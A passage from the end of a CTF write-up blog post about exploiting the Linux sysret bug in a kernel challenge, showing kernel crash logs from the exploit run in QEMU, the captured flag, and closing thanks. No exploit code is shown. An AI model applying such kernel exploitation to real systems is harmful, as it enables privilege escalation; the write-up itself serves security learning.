[   93.378081] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.378552] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.378881] CR2: 00007ffc8370b858 CR3: 0000000100ac4004 CR4: 0000000000770ef0
[   93.379292] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.379712] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.380129] PKRU: 55555554
[   93.380290] Call Trace:
[   93.380438] Modules linked in:
[   93.380625] ---[ end trace 0000000000000000 ]---
[   93.380897] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.381212] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 &lt;48&gt; 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.382302] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.382606] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.383027] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.383444] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.383857] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.384274] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
[   93.384689] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.385154] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.385496] CR2: 00007ffc8370b858 CR3: 0000000100ac4004 CR4: 0000000000770ef0
[   93.385915] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.386333] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.386745] PKRU: 55555554
[   93.386907] note: exploit[83] exited with irqs disabled
[   93.387268] general protection fault
[   93.387485] general protection fault, maybe for address 0x56: 0000 [#2] PREEMPT SMP NOPTI
[   93.387958] CPU: 0 PID: 85 Comm: exploit Tainted: G      D            6.3.4 #14
[   93.388394] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.388947] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.389256] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 &lt;48&gt; 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.390325] RSP: 0018:ffffffffb6c3b768 EFLAGS: 00010046
[   93.390633] RAX: 0000000000000056 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.391053] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.391468] RBP: 0000002d00000000 R08: 0000612f706d742f R09: 0000612f706d742f
[   93.391879] R10: 0000612f706d742f R11: 0000000000000246 R12: ffffffffb6c3a320
[   93.392302] R13: ffffffffb7240160 R14: ffff8d9100049600 R15: 0000612f706d742f
[   93.392718] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.393176] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.393515] CR2: 00007ffc83709fe4 CR3: 0000000100ac8005 CR4: 0000000000770ef0
[   93.393932] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.394347] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.394757] PKRU: 55555554
[   93.394919] Call Trace:
[   93.395065] Modules linked in:
[   93.395247] ---[ end trace 0000000000000000 ]---
[   93.395512] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.395824] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 &lt;48&gt; 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.396906] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.397208] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.397619] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.398028] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.398434] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.398840] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
[   93.399251] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.399717] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.400051] CR2: 00007ffc83709fe4 CR3: 0000000100ac8005 CR4: 0000000000770ef0
[   93.400469] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.400881] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.401295] PKRU: 55555554
[   93.401457] note: exploit[85] exited with irqs disabled
[   93.402397] ------------[ cut here ]------------
[   93.402683] WARNING: CPU: 0 PID: 30 at kernel/ucount.c:285 dec_rlimit_ucounts+0x4f/0x60
[   93.403149] Modules linked in:
[   93.403341] CPU: 0 PID: 30 Comm: kworker/u2:2 Tainted: G      D            6.3.4 #14
[   93.403797] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.404358] Workqueue: events_unbound call_usermodehelper_exec_work
[   93.404727] RIP: 0010:dec_rlimit_ucounts+0x4f/0x60
[   93.405014] Code: c1 04 31 48 29 d0 78 22 48 39 cf 4c 0f 44 c0 48 8b 41 10 48 8b 88 e0 01 00 00 48 85 c9 75 db 4d 85 c0 0f 94 c0 c3 cc cc cc cc &lt;0f&gt; 0b eb da 31 c0 c3 cc cc cc cc 66 0f 1f 44 00 00 90 90 90 90 90
[   93.406089] RSP: 0018:ffffa71340107d00 EFLAGS: 00010297
[   93.406404] RAX: ffffffffffffffff RBX: ffffa71340107e08 RCX: ffffffffb6c3b6c0
[   93.406820] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffffb6c3b6c0
[   93.407240] RBP: ffff8d9100c442c0 R08: ffffffffffffffff R09: ffffffffffffffff
[   93.407651] R10: 00000000000000ba R11: 00000000000009e8 R12: ffffffffb6c3b6c0
[   93.408065] R13: 0000000000000010 R14: dead000000000122 R15: 0000000000000000
[   93.408482] FS:  0000000000000000(0000) GS:ffff8d913bc00000(0000) knlGS:0000000000000000
[   93.408947] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.409288] CR2: 000000000065eff0 CR3: 000000004222c006 CR4: 0000000000770ef0
[   93.409709] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.410125] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.410541] PKRU: 55555554
[   93.410708] Call Trace:
[   93.410862]  &lt;TASK&gt;
[   93.410992]  release_task+0x47/0x4b0
[   93.411217]  ? thread_group_cputime_adjusted+0x46/0x70
[   93.411522]  wait_consider_task+0x90d/0x9e0
[   93.411770]  do_wait+0x17b/0x2c0
[   93.411966]  kernel_wait+0x44/0x90
[   93.412175]  ? __pfx_child_wait_callback+0x10/0x10
[   93.412461]  call_usermodehelper_exec_work+0x72/0x80
[   93.412754]  process_one_work+0x1b1/0x340
[   93.412994]  worker_thread+0x45/0x3b0
[   93.413219]  ? __pfx_worker_thread+0x10/0x10
[   93.413473]  kthread+0xd1/0x100
[   93.413659]  ? __pfx_kthread+0x10/0x10
[   93.413883]  ret_from_fork+0x29/0x50
[   93.414103]  &lt;/TASK&gt;
[   93.414238] ---[ end trace 0000000000000000 ]---
/tmp/bad: line 1: : not found
corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs manual.}
</code></pre></div></div>

<p>After a few runs the prefetch attacks succeeded and the exploit worked! flag!</p>

<h2 id="closing">closing</h2>

<p>This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug ever since I learned about it. So, thanks to FizzBuzz101 for creating this challenge!</p>

<style>
.caption {
  text-align: center;
  font-size: .8rem !important;
  color: lightgrey;
}
</style>


        
      </section>

      <footer class="page__meta">
        
        
  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      <a href="/tags/#ctf-writeup" class="page__taxonomy-item" rel="tag">CTF Writeup</a><span class="sep">, </span>
    
      <a href="/tags/#exploitation" class="page__taxonomy-item" rel="tag">Exploitation</a><span class="sep">, </span>
    
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      <a href="/tags/#sidechannels" class="page__taxonomy-item" rel="tag">Sidechannels</a>
    
    </span>
  </p>




        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-07-30T00:00:00+00:00">July 30, 2023</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/dedup-attacks/" class="pagination--pager" title="Understanding Memory Deduplication Attacks
">Previous</a>
    
    
      <a href="/understanding-paging/" class="pagination--pager" title="Understanding x86_64 Paging
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/aslrnt/" rel="permalink">ASLRn’t: How memory alignment broke library ASLR
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2024-01-08T00:00:00+00:00">January 8, 2024</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          8 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Reading the title of this blog, you may be rightfully skeptical, something “broke library ASLR”??? uhuh, sure.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/understanding-paging/" rel="permalink">Understanding x86_64 Paging
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2023-12-27T00:00:00+00:00">December 27, 2023</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          13 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">I’ve spent quite a lot of time messing with x86_64 page tables, understanding address translation is not easy and when I started learning about it I felt lik...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/dedup-attacks/" rel="permalink">Understanding Memory Deduplication Attacks
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2023-06-17T00:00:00+00:00">June 17, 2023</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          13 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak...</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
          <li><a href="https://twitter.com/zolutal" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
        
      
        
      
        
          <li><a href="https://github.com/zolutal" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
        
      
        
      
        
      
        
      
    

    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 Justin Miller. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>










  </body>
</html>
